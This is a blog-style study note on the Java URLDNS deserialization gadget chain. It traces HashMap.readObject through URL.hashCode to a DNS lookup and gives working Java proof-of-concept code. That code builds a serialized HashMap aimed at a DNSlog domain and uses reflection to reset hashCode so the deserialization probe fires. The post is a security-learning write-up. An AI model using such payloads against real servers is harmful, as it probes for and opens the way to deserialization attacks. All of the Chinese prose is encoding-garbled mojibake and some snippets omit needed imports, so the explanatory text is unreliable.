---
layout: mypost
title: "åˆæ¢å—…æ¢é“¾-URLDNSé“¾"
categories: [Javaå®‰å…¨]
---

## å‰è¨€

å…¥é—¨é“¾ã€å¼€å±±é“¾ã€å—…æ¢é“¾ï¼Œç”¨æ¥ç«¯æ­£å¯¹ååºåˆ—åŒ–æ¼æ´çš„ç†è§£ï¼Œç‰¹æ­¤è®°å½•ã€‚è¿™æ¡é“¾çš„gadgetåªç”¨åˆ°äº†HashMapå’ŒURLï¼Œå¯ä»¥è¯´æ˜¯JDKåŸç”Ÿæ€çš„é“¾å­ï¼Œä¸å­˜åœ¨ä»€ä¹ˆç‰ˆæœ¬é™åˆ¶ï¼Œä½†æ˜¯è¿™æ¡é“¾çš„sinkåªæ˜¯ä¸€æ¬¡DNSè¯·æ±‚ï¼Œå®é™…æƒ…å†µä¸­çš„ä½œç”¨æ˜¯ç”¨æ¥éªŒè¯æœåŠ¡å™¨ç±»æ˜¯å¦ä½¿ç”¨äº†`readObject()`ï¼Œèƒ½ä¸èƒ½å»å½“ä¸€ä¸ªæˆåŠŸçš„å…¥å£ç±»ï¼Œè¿™æ¡é“¾å­è‹¥èƒ½æ‰“é€šï¼Œä¹‹åå†ç”¨å„ç§gadgetå»å°è¯•RCEï¼Œè¿™æ¡é“¾å­ä¸é€šåŸºæœ¬æ²¡æˆã€‚

## ç«¯æ­£æ€æƒ³ğŸ’­

1.ç›®å‰ç ”ç©¶çš„é“¾å­æ˜¯é’ˆå¯¹æœåŠ¡ç«¯ä¸Šçš„ï¼Œé¡¹ç›®å®ƒæœ¬èº«å°±ä¼šæœ‰è¿™ç§æ¼æ´ï¼Œè¦åˆ©ç”¨å®ƒåªæ˜¯ç¼ºå°‘ä¸€ä¸ªè¾“å…¥ç‚¹ã€‚å†é€šä¿—ä¸€ç‚¹è®²å°±æ˜¯ï¼Œåªè¦é¡¹ç›®çš„ä»£ç ä¸­æš´éœ²å‡ºä¸€ä¸ª`readObject()`å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼Œä¹Ÿå°±æ˜¯`xxx.readObject()`ä¸­çš„`xxx`ï¼Œé‚£ä¹ˆè‡³å°‘URLDNSé“¾è¿™æ¡é“¾å­æ˜¯è‚¯å®šèƒ½é€šçš„ã€‚

2.ä¸€ä¸ªæˆåŠŸçš„å…¥å£ç±»ï¼Œé¦–å…ˆè¦æ”¯æŒåºåˆ—åŒ–ï¼ˆä¹Ÿå°±æ˜¯å»implements Serializableï¼‰ï¼Œå…¶æ¬¡ä¸€å®šæ˜¯è¦å»é‡å†™`readObject()`æ–¹æ³•ï¼Œè‹¥æ²¡æœ‰å®ç°`Serializable`è¯¥æ¥å£é‚£ä¹ˆååºåˆ—åŒ–ä¼šæŠ¥é”™ã€åŸç”Ÿè°ƒç”¨çš„`readObject()`ä¸€å®šæ˜¯å®‰å…¨çš„ï¼Œåªæœ‰é‡å†™äº†æ‰æœ‰å¯èƒ½è¢«åˆ©ç”¨ã€‚

3.å½“å®¢æˆ·ç«¯é€šè¿‡ç½‘ç»œå°†ä¸€ä¸ªå¯¹è±¡ä¼ é€’ç»™æœåŠ¡ç«¯æ—¶ï¼ŒæœåŠ¡ç«¯å¿…é¡»èƒ½å¤Ÿæ‰¾åˆ°å¹¶åŠ è½½è¯¥å¯¹è±¡çš„ç±»ï¼Œå¦åˆ™ååºåˆ—åŒ–ä¼šå¤±è´¥ï¼Œå› ä¸ºååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼ŒJava ä¼šè¯•å›¾æ¢å¤å¯¹è±¡å¹¶ä½¿ç”¨å…¶ç±»çš„å®šä¹‰ã€‚å¯ä»¥å…ˆå»å†çœ‹ä¸€ä¸‹Javaä¸­çš„ç±»åŠ è½½æœºåˆ¶ã€‚å“¦å¯¹ï¼Œæ­£å¥½ç”¨è¿™ç‚¹æåŠä¸€ä¸‹ï¼Œæ¼æ´æœ¬è´¨æ˜¯å‡ºç°åœ¨æœåŠ¡ç«¯ï¼Œè‹¥æœåŠ¡ç«¯æ˜¯ä¸€å±‚ç™½çº¸ï¼Œå†å·§å¦™çš„Payloadä¹Ÿæ— æµäºäº‹ã€‚

## å¾ªåºæ¸è¿›çš„è®ºURLDNSé“¾

1.å…ˆçœ‹sink-->URLç±»çš„`hashCode()`å‡½æ•°ï¼Œå†™ä¸€ä¸ªæœ€ç®€å•çš„demoå¦‚ä¸‹

```java
public class Serialize {
    public static void main(String[] args) throws Exception {
        try {
            URL url = new URL("http://test.cxsys.spacestabs.top");
            url.hashCode();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
```

è·Ÿä¸€ä¸‹è¿™ä¸ªhashCodeæ–¹æ³•ï¼Œé»˜è®¤çš„hashCodeæ˜¯ç­‰äº-1çš„ï¼Œæ‰€ä»¥èµ°åˆ°ä¸‹é¢`hashCode = handler.hashCode(this);`

![alt text](1.png)

æ­¤æ—¶çš„handleræ˜¯URLStreamHandlerè¿™ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥ä¼šè·³åˆ°è¿™ä¸ªç±»çš„hashCodeæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸­372è¡Œæœ‰ä¸€ä¸ª`getHostAddress()`æ–¹æ³•ï¼Œæ–¹æ³•å¤§æ¦‚æ„æ€å°±æ˜¯å°è¯•é€šè¿‡ç»™å®šçš„ URL è·å–ä¸»æœºçš„ IP åœ°å€ï¼Œè¯´ç™½äº†å°±æ˜¯è¿›è¡Œä¸€æ¬¡DNSæŸ¥è¯¢ã€‚

![alt text](2.png)

æ‰§è¡Œå®Œä¹‹åï¼Œçœ‹ä¸€ä¸‹DNSlogå¹³å°ä¹Ÿç¡®å®æ”¶åˆ°äº†å›æ˜¾

![alt text](3.png)

ä¹Ÿå¯ä»¥è·Ÿä¸€è·Ÿè¿™ä¸ªæ–¹æ³•ï¼Œä¸Šé¢å®Œäº†åº”è¯¥åˆ°è¿™é‡Œ`resolver.lookupByName(host, PLATFORM_LOOKUP_POLICY);`

![alt text](3.png)

è·Ÿè·Ÿè·Ÿï¼Œæœ€ååˆ°è¿™é‡ŒF8ä¹‹åï¼ŒDNSlogå¹³å°å°±æ”¶åˆ°å›æ˜¾äº†ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­ä¼šå‡ºç°è¿è¡Œå®ŒPayloadï¼Œä½†DNSlogæœ‰æ—¶å¯ä»¥æ”¶åˆ°è¯·æ±‚ï¼Œæœ‰æ—¶æ”¶ä¸åˆ°è¯·æ±‚ï¼Œè¿™å’Œæœ¬æœºçš„DNSç¼“å­˜ä»¥åŠTTLå€¼æœ‰å…³ï¼Œå’Œä»£ç æœ¬èº«æ— å…³ã€‚

![alt text](5.png)

ä¹‹åå°±ä¸€è·¯returnï¼Œå›åˆ°è¿™é‡Œåˆšåˆš`resolver.lookupByName(host, PLATFORM_LOOKUP_POLICY);`ï¼Œæ­¤æ—¶å°±å¾—åˆ°äº†åŸŸåè§£æåçš„ipåœ°å€ï¼Œä¹Ÿå°±æ˜¯127.0.0.1

![alt text](6.png)

ä¸Šé¢è¿™äº›å°±æ˜¯é˜è¿°äº†ä¸€ä¸‹ä¸ºä»€ä¹ˆè¿™ä¸ªç®—Hashçš„sinkå¯ä»¥å‘èµ·ä¸€æ¬¡DNSæŸ¥è¯¢ï¼Œå½“ç„¶è‚¯å®šå°±æœ‰ç–‘é—®äº†ï¼ŒURLè¿™ä¸ªç±»æœ¬èº«å°±æ˜¯åšç½‘ç»œè¯·æ±‚ç›¸å…³çš„ç±»ï¼Œè¦æƒ³åœ¨å…¶ä¸­æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å¯¹URLå‘èµ·è¯·æ±‚çš„æ–¹æ³•é‚£å¯å¤ªå®¹æ˜“äº†ï¼Œä¸ºä»€ä¹ˆååè¦æ‰¾è¿™ä¸ª`hashCode()`æ–¹æ³•å‘¢ï¼Ÿåªèƒ½è¯´å¾ˆå¤šæ—¶å€™ï¼Œæœ‰ä½†ä¸èƒ½ç”¨ï¼Œæ²¡æ³•å»è®©æœåŠ¡ç«¯ç¨‹åºå»ä¸»åŠ¨æ‰§è¡Œè¿™äº›æ–¹æ³•å•Š......

ç„¶åå°±å¯ä»¥å¼•å‡ºåºåˆ—åŒ–&ååºåˆ—åŒ–äº†ï¼Œä¸€æ—¦åºåˆ—åŒ–ï¼Œé‚£å°±å¿…ç„¶ä¼šè¢«ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–å¿…ç„¶ä¼šç”¨åˆ°`readObject()`æ–¹æ³•ï¼Œè‹¥é‡å†™çš„è¿™ä¸ª`readObject()`æ–¹æ³•æœ‰å±é™©çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€ æˆä¸€æ¬¡æ”»å‡»ã€‚ç°åœ¨å¸¦å…¥æŒ–æ˜æ¼æ´çš„è§†è§’å»çœ‹ä¸€ä¸‹ï¼Œæ€ä¹ˆæ‰èƒ½è®©è¿™ä¸ª`hashCode()`æ–¹æ³•æˆ–è€…è¯´æ˜¯å…¶ä»–å±é™©æ–¹æ³•è¢«æ‰§è¡Œå‘¢ï¼Ÿæˆ‘è‚¯å®šå…ˆä¼šå»çœ‹URLè¿™ä¸ªç±»ï¼Œå¦‚ä¸‹å›¾ï¼Œå®ƒç¡®å®å»å®ç°äº†`java.io.Serializable`ï¼Œä¸”é‡å†™äº†`readObject()`æ–¹æ³•ï¼Œè¦æ˜¯é‡Œé¢æœ‰å±é™©æ–¹æ³•å°±å¥½äº†ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸ç°å®çš„ï¼Œå¼€å‘äººå‘˜ä¹Ÿæ²¡æœ‰è¿™ä¹ˆå¼±æ™ºã€‚

![alt text](7.png)

2.æ¢ä¸€ç§æ€è·¯ï¼Œæ—¢ç„¶è¿™ä¸ªURLç±»çš„`readObject()`æ–¹æ³•æ²¡æœ‰å±é™©å‡½æ•°ï¼Œä½†å¦‚æœèƒ½æ‰¾è§ä¸€ä¸ªç±»ï¼Œå®ƒçš„`readObject()`æ–¹æ³•æœ‰å±é™©æ–¹æ³•(è¿™é‡Œçš„å±é™©æ–¹æ³•å°±å§‘ä¸”å…ˆæ˜¯URLç±»çš„`hashCode()`æ–¹æ³•)ï¼Œä¸”å‚æ•°èƒ½ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œé‚£å°±å¯ä»¥æŠŠURLç±»çš„å¯¹è±¡ä¼ è¿›å»ï¼Œè°ƒç”¨è¿™ä¸ªä¸­é—´ç±»çš„`hashCode()`æ–¹æ³•ï¼Œä¹Ÿå°±ç›¸å½“äºè°ƒç”¨äº†URLç±»çš„`hashCode()`æ–¹æ³•ï¼Œè¿™æ ·å°±å®Œæˆäº†æ”»å‡»ã€‚ç›´ç™½ç‚¹è¯´å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ„æ€

```
åœºæ™¯-->
ç±» Aï¼šå…¥å£ç±»ï¼Œæ¥æ”¶ä¸€ä¸ªå‚æ•° param
ç±» Bï¼šåŒ…å«æˆ‘ä»¬çœŸæ­£æƒ³åˆ©ç”¨çš„æ–¹æ³• exp
éœ€æ±‚ï¼šé€šè¿‡ A çš„ readObject æ–¹æ³•æ¥è°ƒç”¨ B çš„æ–¹æ³• exp

åšæ³•-->
1. ç±» A æ¥æ”¶ä¸€ä¸ªå‚æ•° paramï¼Œå¹¶åœ¨ readObject æ–¹æ³•ä¸­è°ƒç”¨ param.exp
2. B ä¸­æœ‰æˆ‘ä»¬æƒ³è°ƒç”¨çš„å®é™…æ–¹æ³• exp
3. å°†ç±»Bå½“ä½œå‚æ•°ä¼ å…¥åˆ°Aä¸­ï¼Œä¹Ÿå°±å®ç°äº†B.exp
```

ç„¶åå¾ˆå¹¸è¿HashMapç±»å®ç°äº†`java.io.Serializable`ï¼Œä¸”é‡å†™äº†`readObject()`æ–¹æ³•ï¼Œä¸”å‚æ•°èƒ½ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œä¸”å…¶ä¸­æœ‰`å‚æ•°.hashCode()`çš„æ–¹å¼ï¼Œè¯¦æƒ…å¦‚ä¸‹å›¾ç‰‡-->

![alt text](8.png)

è·Ÿè¿›å»ä¸Šå›¾çš„hashæ–¹æ³•

![alt text](9.png)

ç»™keyç®—äº†ä¸€æ¬¡hashCodeï¼Œä¸”è¿™ä¸ªkeyæ˜¯ä¸€ä¸ªç±»å‹ä¸ºObjectçš„å‚æ•°ï¼Œå¦‚æœæ­¤æ—¶è¿™ä¸ªkeyæ˜¯ä¸€ä¸ªURLç±»ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•æ‰§è¡Œåå°±ä¼šå»è°ƒç”¨URLç±»çš„`hashCode()`æ–¹æ³•ï¼Œå°±å¯ä»¥æˆåŠŸçš„å‘èµ·ä¸€æ¬¡DNSè¯·æ±‚ã€‚å¾ˆç®€å•ï¼Œå°±ä¸€æ¬¡åŒåå‡½æ•°çš„æ›¿æ¢ï¼Œä¸‹é¢ç»™å‡ºURLDNSé“¾å®Œæ•´çš„gadget-->

```
1. HashMap->readObject()
2. HashMap->hash()
3. URL->hashCode()
4. URLStreamHandler->hashCode()
5. URLStreamHandler->getHostAddress()
6. InetAddress->lookupByName()
```

ä¸‹é¢æ˜¯è¿™æ¬¡æ¼æ´åˆ©ç”¨çš„ä»£ç -->

Serializeç±»å¦‚ä¸‹

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.HashMap;

public class Serialize {
    public static void main(String[] args) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();
        URL url = new URL("http://test.cxsys.spacestabs.top");
        hashmap.put(url,1);

        outputStream.writeObject(hashmap);
        outputStream.close();
    }
}
```

Unserializeç±»å¦‚ä¸‹

```java
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class Unserialize {
    public static void main(String[] args) throws Exception {
        FileInputStream fileInputStream = new FileInputStream("ser.bin");
        ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
        Object o = inputStream.readObject();
        inputStream.close();
    }
}
```

3.ä¸Šé¢ä¸¤ç‚¹å°±æ˜¯æ ¸å¿ƒäº†ï¼Œè¿™ä¸€ç‚¹æ¥è®°å½•ç‚¹æ— å…³ç´§è¦çš„ï¼Œè°ƒçš„æ—¶å€™å¥½å¥‡äº†ä¸€ä¸‹ä¸‹é¢è¿™ä¸ªåœ°æ–¹-->

![alt text](10.png)

ä¸ºä»€ä¹ˆå·²ç»é€šè¿‡åå°„è°ƒç”¨äº†ä¸€æ¬¡HashMapçš„`readObject()`æ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•é‡Œé¢åˆè°ƒç”¨äº†ä¸¤æ¬¡`readObject()`æ–¹æ³•ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯å¯¹å‚æ•°è¿›è¡Œçš„readObjectï¼Œä¹Ÿå°±æ˜¯å…ˆå¾—ååºåˆ—åŒ–æ‹¿åˆ°å‚æ•°ï¼Œå°±æ‹¿ä¸Šé¢çš„ä»£ç ä¸­çš„`K key = (K) s.readObject();`æ¥çœ‹(ä¸‹é¢é‚£ä¸ªå’Œè¿™ä¸ªåŒç†)ï¼Œè¿™ä¸ªkeyå€¼æ˜¯ä¸€ä¸ªURLç±»ï¼Œä¸€å¼€å§‹åœ¨çœ‹sinkçš„æ—¶å€™å°±æåˆ°URLç±»ä¹Ÿæ˜¯é‡å†™äº†readObjectçš„ï¼Œé‚£ä¹ˆè¿™ä¸ª`readObject()`æ–¹æ³•æ‰§è¡Œå®Œä¹‹åå¿…ç„¶ä¼šåˆ°URLç±»çš„readObjectæ–¹æ³•ï¼Œè€Œä¸æ˜¯åŸç”Ÿçš„readObjectï¼Œè·Ÿä¸€ä¸‹çœ‹çœ‹ï¼Œæœç„¶åˆ°äº†URLç±»é‡Œé¢ï¼Œå¦‚ä¸‹å›¾-->

![alt text](11.png)

ä¸‹é¢æ˜¯æ­¤æ—¶çš„è°ƒç”¨æ ˆï¼Œç”±äºä¸¤æ¬¡çš„readObjectéƒ½æ˜¯privateï¼Œæ‰€ä»¥éƒ½æ˜¯é€šè¿‡åå°„å»è°ƒç”¨çš„ï¼Œæœ‰ä¸€ç§ä¸€å±‚å¥—ä¸€å±‚çš„æ„Ÿè§‰ã€‚

![alt text](12.png)

åŸºæœ¬ä¸Šè®°å½•çš„å¾ˆæ¸…æ™°äº†ï¼Œä½†è¿˜æ˜¯æœ‰ç‚¹å°é—®é¢˜éœ€è¦å»è§£å†³

## é—®é¢˜ä»¥åŠä¼˜åŒ–

å¤§ä½“æ€è·¯ä¸Šå¯¹äº†ï¼Œå†è·Ÿä»£ç çš„æ—¶å€™å‘ç°é—®é¢˜å¦‚ä¸‹-->

å°†æ–­ç‚¹ä¸‹åœ¨ä¸‹å›¾å¤„ï¼Œè¿è¡ŒUnserializeç±»

![alt text](10.png)

æ¥ç€åˆ°è¿™é‡ŒhashCodeæ–¹æ³•è¿™é‡Œ

![alt text](13.png)

ä¸‹é¢æŒ‰ç…§é¢„æœŸæ˜¯åˆ°URLç±»å¯¹è±¡çš„hashCodeæ–¹æ³•é‡Œé¢

![alt text](14.png)

ç¡®å®æ˜¯åˆ°URLè¿™é‡Œäº†ï¼Œä½†æ˜¯å¯ä»¥å‘ç°ç”±äºhashCodeå·²ç»æœ‰å€¼äº†ï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥`return hashCode;`ï¼Œé‚£ä¹ˆè¿™é‡Œå…¶å®æ ¹æœ¬å°±æ²¡æœ‰å»æ‰§è¡Œåç»­çš„sinkï¼Œä½†æ˜¯DNSLogå¹³å°ä¸Šä¾ç„¶æ”¶åˆ°äº†å€¼ï¼Œåç»­å†è°ƒè¯•è°ƒè¯•å°±ä¼šå‘ç°å¹¶ä¸æ˜¯è¿è¡ŒUnserializeç±»è§¦å‘äº†sinkï¼Œè€Œæ˜¯è¿è¡ŒSerializeç±»çš„æ—¶å€™é‡Œé¢çš„`put()`å‡½æ•°å°±å·²ç»è§¦å‘äº†sinkï¼ˆè¿™é‡Œå°±ä¸è·Ÿäº†ï¼‰ï¼Œä¸”è§¦å‘å®Œsinkè¿˜å°†hashCodeèµ‹å€¼äº†ï¼Œå¦‚ä¸‹-->

![alt text](15.png)

å³åºåˆ—åŒ–æ—¶å°±hashCodeçš„å€¼å°±ä¸º2133919961ï¼Œæ‰€ä»¥ååºåˆ—åŒ–çš„æ—¶å€™æ ¹æœ¬è§¦å‘ä¸äº†sinkï¼æŠŠSerializeç±»çš„ä»£ç å•æ‹‰å‡ºæ¥ï¼Œåšä¸€äº›ä¿®æ”¹

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.HashMap;

public class Serialize {
    public static void main(String[] args) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();
        URL url = new URL("http://test.cxsys.spacestabs.top");
        hashmap.put(url,1);

        outputStream.writeObject(hashmap);
        outputStream.close();
    }
}
```

éœ€æ±‚æ˜¯åœ¨`hashmap.put(url,1);`è¿™è¡Œä»£ç æ‰§è¡Œå®Œåï¼ŒæŠŠhashCodeçš„å€¼æ”¹å›åˆå§‹å€¼ï¼Œä¹Ÿå°±æ˜¯-1ï¼Œè¿™é‡Œåå°„å»æ”¹å°±å¥½äº†ã€‚æ”¹å®Œçš„ä»£ç å¦‚ä¸‹-->

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.HashMap;

public class Serialize {
    public static void main(String[] args) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();
        URL url = new URL("http://test.cxsys.spacestabs.top");
        hashmap.put(url,1);
        Class<?> clazz = url.getClass();
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,-1);
        outputStream.writeObject(hashmap);
        outputStream.close();
    }
}
```

è¿™ä¸ªæ ·å­å…¶å®å°±å¯ä»¥äº†ï¼Œåªè¿è¡ŒUnserializeç±»ä¹‹åæŸ¥çœ‹DNSLogå¹³å°å¯ä»¥æŸ¥æ”¶åˆ°è®°å½•ï¼Œä¹‹å‰é‚£æ ·æ˜¯æ”¶ä¸åˆ°çš„

![alt text](16.png)

å†è¿›ä¸€æ­¥ä¼˜åŒ–ä¸€ä¸‹å°±æ˜¯åœ¨`hashmap.put(url,1);`ä¹‹å‰å…ˆæŠŠhashCodeçš„å€¼æ”¹æˆä¸ä¸º1ï¼Œåœ¨`hashmap.put(url,1);`å†æ”¹ä¸º-1ï¼Œè¿™æ ·å°±æ›´åŠ å‡†ç¡®äº†ï¼Œä»£ç å¦‚ä¸‹-->

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.HashMap;

public class Serialize {
    public static void main(String[] args) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();
        URL url = new URL("http://test.cxsys.spacestabs.top");
        Class<?> clazz = url.getClass();
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,1);
        hashmap.put(url,1);
        field.set(url,-1);
        outputStream.writeObject(hashmap);
        outputStream.close();
    }
}
```

æˆªå›¾å¦‚ä¸‹

è¿è¡ŒSerializeç±»æ—¶å€™hashCodeçš„å€¼

![alt text](17.png)

è¿è¡ŒUnserializeç±»æ—¶å€™hashCodeçš„å€¼

![alt text](18.png)

From Zero To One Close! 